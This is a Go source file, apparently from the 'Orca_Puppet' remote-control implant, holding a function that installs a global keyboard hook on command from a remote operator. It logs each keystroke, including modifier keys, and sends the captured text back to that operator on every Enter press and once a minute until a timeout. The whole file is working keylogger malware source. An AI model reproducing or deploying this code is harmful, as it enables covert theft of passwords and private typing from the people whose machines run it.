package controller

import (
	"Orca_Puppet/cli/cmdopt/keyloggeropt"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/debug"
	hook "github.com/robotn/gohook"
	"strconv"
	"time"
)

func keyloggerCmd(sendUserId, decData string) {
	// 初始化键盘记录退出信号通道
	keyloggerQuitSignChan, exist := setchannel.GetKeyloggerQuitSignChan(sendUserId)
	if !exist {
		keyloggerQuitSignChan = make(chan interface{})
		setchannel.AddKeyloggerQuitSignChan(sendUserId, keyloggerQuitSignChan)
	}

	// 获取超时时间
	timeout, err := strconv.Atoi(decData)
	if err != nil {
		return
	}
	evChan := hook.Start()
	defer hook.End()

	var keyCode uint16
	var ctrlCode uint16
	var holdCode uint16
	var sendCodeStr string
	var sendSign bool

	i := 0
	ticker := time.NewTicker(60 * time.Second)
	go func() {
		for range ticker.C {
			sendSign = true
		}
	}()

	for ev := range evChan {
		select {
		case <-keyloggerQuitSignChan:
			debug.DebugPrint("Keylogger Interrupt")
			return
		default:
			if ev.Kind == hook.KeyHold {
				if ev.Rawcode == 160 || ev.Rawcode == 161 || ev.Rawcode == 162 || ev.Rawcode == 163 || ev.Rawcode == 164 || ev.Rawcode == 165 {
					ctrlCode = ev.Rawcode
					sendCodeStr += keyloggeropt.RawCodeMap[ctrlCode] + "[ "
				}
				if ev.Rawcode == 91 || ev.Rawcode == 92 {
					if ev.Rawcode != holdCode {
						ctrlCode = ev.Rawcode
						sendCodeStr += keyloggeropt.RawCodeMap[ctrlCode] + "[ "
					}
				}
				holdCode = ev.Rawcode
			}
			if ev.Kind == hook.KeyUp {
				if ev.Rawcode == 91 || ev.Rawcode == 92 || ev.Rawcode == 160 || ev.Rawcode == 161 || ev.Rawcode == 162 || ev.Rawcode == 163 || ev.Rawcode == 164 || ev.Rawcode == 165 {
					ctrlCode = ev.Rawcode
					sendCodeStr += "]" + keyloggeropt.RawCodeMap[ctrlCode] + " "
					if holdCode == 91 || holdCode == 92 {
						holdCode = 0
					}
				}
			}
			if ev.Kind == hook.KeyDown {
				keyCode = ev.Rawcode
				sendCodeStr += keyloggeropt.RawCodeMap[keyCode] + " "
				if keyloggeropt.RawCodeMap[keyCode] == "Enter" {
					sendSign = false
					keyloggeropt.SendKeyloggerData(sendUserId, sendCodeStr)
					sendCodeStr = ""
				}
			}
			if sendSign == true {
				i++
				if sendCodeStr != "" {
					keyloggeropt.SendKeyloggerData(sendUserId, sendCodeStr)
				}
				sendCodeStr = ""
				sendSign = false
				if i >= timeout {
					keyloggeropt.SendKeyloggerData(sendUserId, "Keylogger End")
					return
				}
			}
		}

	}

}
